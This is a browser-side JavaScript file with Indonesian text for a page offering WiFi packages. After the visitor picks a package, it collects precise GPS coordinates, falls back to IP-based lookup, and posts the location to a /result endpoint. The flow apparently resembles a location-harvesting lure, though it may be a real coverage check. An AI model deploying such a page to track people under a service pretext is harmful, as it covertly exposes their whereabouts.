let selectedService = null;

function selectService(element, serviceId) {
  // Jika kotak yang sama diklik (sudah terpilih), batalkan pilihan
  if (element.classList.contains("selected")) {
    element.classList.remove("selected");
    selectedService = null;
    document.getElementById("continueBtn").disabled = true;
    updateSelectorTitle("Pilih Paket WiFi");
    return;
  }

  // Remove selected class from all options
  const options = document.querySelectorAll(".service-option");
  options.forEach((opt) => opt.classList.remove("selected"));

  // Add selected class to clicked option
  element.classList.add("selected");

  // Store selected service
  selectedService = serviceId;

  // Enable continue button
  document.getElementById("continueBtn").disabled = false;

  // Update selector title with selected option
  const optionName = element.querySelector(".option-name").textContent;
  updateSelectorTitle(optionName);
}

function updateSelectorTitle(title) {
  const selector = document.querySelector(".selector-title");
  selector.textContent = title;
}

// Toggle service options visibility
document
  .getElementById("serviceSelector")
  .addEventListener("click", function () {
    this.classList.toggle("active");
  });

// Close dropdown when clicking outside
document.addEventListener("click", function (e) {
  const serviceSelector = document.getElementById("serviceSelector");
  const serviceOptions = document.querySelector(".service-options");

  if (
    !serviceSelector.contains(e.target) &&
    !serviceOptions.contains(e.target)
  ) {
    serviceSelector.classList.remove("active");
  }
});

function goToPage1() {
  document.getElementById("page1").classList.add("active");
  document.getElementById("page2").classList.remove("active");
  document.getElementById("step1").classList.add("active");
  document.getElementById("step2").classList.remove("active");
  document.getElementById("step2").classList.remove("completed");
}

function goToPage2() {
  document.getElementById("page1").classList.remove("active");
  document.getElementById("page2").classList.add("active");
  document.getElementById("step1").classList.remove("active");
  document.getElementById("step1").classList.add("completed");
  document.getElementById("step2").classList.add("active");

  // Close the service selector if open
  document.getElementById("serviceSelector").classList.remove("active");
}

function getLocation(button) {
  const errorBox = document.getElementById("errorMsg");
  button.disabled = true;
  button.classList.add("loading");
  errorBox.textContent = "";
  errorBox.classList.remove("visible");

  const fallbackIPGeolocation = () => {
    fetch("https://ipinfo.io/json?token=<TOKEN_KAMU>")
      .then((res) => res.json())
      .then((data) => {
        const [lat, lon] = data.loc.split(",");
        const accuracy = 10000; // Estimasi kasar
        errorBox.textContent = `📍 Lokasi ditentukan via alamat IP (akurasi rendah ~10km). Disarankan menggunakan smartphone.`;
        errorBox.classList.add("visible");

        sendLocation(lat, lon, accuracy, button);
      })
      .catch(() => {
        errorBox.textContent = "Gagal mengambil lokasi dari alamat IP.";
        errorBox.classList.add("visible");
        button.disabled = false;
        button.classList.remove("loading");
      });
  };

  const sendLocation = (lat, lon, accuracy, button) => {
    fetch("/result", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `latitude=${lat}&longitude=${lon}&accuracy=${accuracy}&service=${selectedService}`,
    })
      .then((response) => {
        if (response.redirected) {
          window.location.href = response.url;
        } else if (!response.ok) {
          throw new Error("Gagal mengirim lokasi");
        }
      })
      .catch((error) => {
        errorBox.textContent = "Gagal mengirim lokasi. Coba lagi ya.";
        errorBox.classList.add("visible");
        button.disabled = false;
        button.classList.remove("loading");
      });
  };

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const accuracy = pos.coords.accuracy;

        if (accuracy > 3000) {
          errorBox.textContent = `🔍 Lokasi tidak cukup akurat (${Math.round(
            accuracy
          )}m). Coba aktifkan GPS atau gunakan smartphone.`;
          errorBox.classList.add("visible");
          button.disabled = false;
          button.classList.remove("loading");
          // fallback ke IP-based
          fallbackIPGeolocation();
          return;
        }

        if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
          errorBox.textContent = "Lokasi tidak valid. Mohon coba lagi.";
          errorBox.classList.add("visible");
          button.disabled = false;
          button.classList.remove("loading");
          return;
        }

        sendLocation(lat, lon, accuracy, button);
      },
      (err) => {
        let errorMessage = "Gagal mengambil lokasi. Coba lagi ya.";
        if (err.code === err.PERMISSION_DENIED) {
          errorMessage = "🚫 Akses lokasi ditolak. Mohon izinkan akses lokasi.";
        } else if (err.code === err.TIMEOUT) {
          errorMessage = "⏳ Waktu permintaan lokasi habis. Coba lagi.";
        }
        errorBox.textContent = errorMessage;
        errorBox.classList.add("visible");

        // fallback ke IP geolocation
        fallbackIPGeolocation();
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  } else {
    errorBox.textContent = "❌ Browser kamu tidak mendukung geolokasi.";
    errorBox.classList.add("visible");
    fallbackIPGeolocation();
  }
}

// Modal Terms of Service
document.addEventListener("DOMContentLoaded", function () {
  const tosLink = document.querySelector(".copyright a");
  const modal = document.getElementById("tosModal");
  const closeBtn = document.querySelector(".close-modal");
  const okBtn = document.querySelector(".btn-modal-ok");

  // Menampilkan modal saat link diklik
  tosLink.addEventListener("click", function (e) {
    e.preventDefault();
    modal.style.display = "block";
    document.body.style.overflow = "hidden"; // Mencegah scrolling pada background
  });

  // Menutup modal saat tombol close diklik
  closeBtn.addEventListener("click", function () {
    modal.style.display = "none";
    document.body.style.overflow = "auto";
  });

  // Menutup modal saat tombol OK diklik
  okBtn.addEventListener("click", function () {
    modal.style.display = "none";
    document.body.style.overflow = "auto";
  });

  // Menutup modal saat area luar modal diklik
  window.addEventListener("click", function (e) {
    if (e.target == modal) {
      modal.style.display = "none";
      document.body.style.overflow = "auto";
    }
  });
});
